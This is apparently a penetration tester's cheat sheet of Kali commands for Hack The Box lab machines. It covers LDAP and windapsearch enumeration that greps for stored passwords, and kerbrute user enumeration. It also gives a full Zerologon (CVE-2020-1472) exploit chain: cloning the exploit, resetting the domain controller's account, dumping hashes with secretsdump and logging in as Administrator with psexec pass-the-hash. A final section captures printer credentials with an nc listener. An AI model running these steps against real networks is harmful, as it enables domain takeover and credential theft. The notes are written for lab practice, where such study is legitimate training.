#### windapsearch.py
```bash - kali
cd /opt && sudo git clone https://github.com/ropnop/windapsearch
```
```bash - kali
sudo apt install python3-ldap
```
```bash - kali
cd windapsearch && ./windapsearch.py -d resolute.megabank.local --dc-ip $TARGET -U
```
```bash - kali
./windapsearch.py -d resolute.megabank.local --dc-ip $TARGET -U --full | grep Password
```
```bash - kali
./windapsearch.py -d resolute.megabank.local --dc-ip $TARGET -U > users
```
#### ldapsearch
```bash - kali
ldapsearch -x -p 389 -h $TARGET -b "dc=<HOSTNAME>,dc=<DOMAIN>" -s sub "*" | grep -i "description"
```
```bash - kali
ldapsearch -x -p 389 -h $TARGET -b "dc=<HOSTNAME>,dc=<DOMAIN>" -s sub "*" | grep -i "password"
```
```bash - kali
ldapsearch -x -p 389 -h $TARGET -b "dc=<HOSTNAME>,dc=<DOMAIN>" -s sub "*" > ldapsearch.txt
```
```
lock lockoutDuration: -18000000000
lockoutObservationWindow: -18000000000
lockoutThreshold: 0
lockoutDuration: -18000000000
lockoutObservationWindow: -18000000000
lockoutThreshold: 0
```
0 means "no lock out policy"
Script to verify user's creds:
##### zerologon
```bash - kali
git clone https://github.com/SecuraBV/CVE-2020-1472
```
```bash - kali
cd CVE-2020-1472 && pip install -r requirements.txt
```
Next, look at the nmap results below to find the CN value:
```bash - kali
tcp_389_ldap_nmap.txt
```
`CN=FOREST`
```bash - kali
python3 zerologon_tester.py <CN> $TARGET
```
`Success!  DC can be fully compromised by a Zerologn attack`
[[Zero]]
```bash - kali
enum4linux $TARGET
```
Now add the target to the hosts file:
```bash - kali
sudo mousepad /etc/hosts
```
```bash - kali
sudo apt install golang
```
```bash - kali
go get github.com/ropnop/kerbrute
```
```bash - kali
cd kerbrute
```
```bash - kali
make linux
```
```bash - kali
cd dist
```
```bash - kali
./kerbrute_linux_amd64 userenum -d Zero.csl --dc Zero.csl /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```
```bash - kali
git clone https://github.com/dirkjanm/CVE-2020-1472
```
```bash - kali
cd CVE-2020-1472
```
```bash - kali
sudo python3 cve-2020-1472-exploit.py ZERO-DC $TARGET
```
```bash - kali
secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'Zero.csl/ZERO-DC$@$TARGET'
```
```bash - kali
psexec.py Administrator@$TARGET -hashes aad3b435b51404eeaad3b435b51404ee:36242e2cb0b26d16fafd267f39ccf990
```
#### HTB Printer Admin Page
sudo rlwrap -cAr nc -lvnp 389
Navigate to settings page:
![[Pasted image 20220218175015.png]]
Enter your Kali IP in the Server Address field.
Click update, get creds in listener.